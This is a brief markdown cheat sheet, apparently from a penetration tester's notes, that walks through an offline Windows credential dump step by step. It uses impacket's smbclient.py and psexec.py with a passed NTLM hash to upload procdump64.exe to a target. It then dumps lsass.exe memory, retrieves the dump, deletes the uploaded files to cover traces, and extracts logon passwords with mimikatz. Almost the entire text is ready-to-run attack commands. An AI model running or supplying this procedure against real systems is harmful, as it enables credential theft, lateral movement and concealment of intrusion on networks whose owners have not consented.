## mimikatz

### offline dump

Versions used:

* `impacket v0.9.19-dev`
* `mimikatz`
* `procdump64.exe`


Send `procdump64.exe` using `smclient.py`:

```
smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:9f0e084ccc077085a245845e8674add ./Administrator@192.168.0.1

use C$
cd windows/temp
mkdir test_34
cd test_34
put procdump64.exe
```

Dump `lsass.exe` using `procdump64.exe` through `psexec.py`:

```
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9f0e084ccc077085a245845e8674add ./Administrator@192.168.0.1

cd ../temp/test_34
procdump64.exe -accepteula -ma lsass.exe hello.dmp
exit
```

Retrieve `hello.dmp` using `smbclient.py` then clean:

```
get hello.dmp
rm hello.dmp
rm procdump64.exe
cd ../
rmdir test_34
exit
```

Get logon passwords using `mimikatz` (extract from a Windows with a major NT version equal to the victim one):

```
sekurlsa::minidump hello.dmp
log 192.168.0.1_sekurlsa.log
sekurlsa::logonPasswords
```






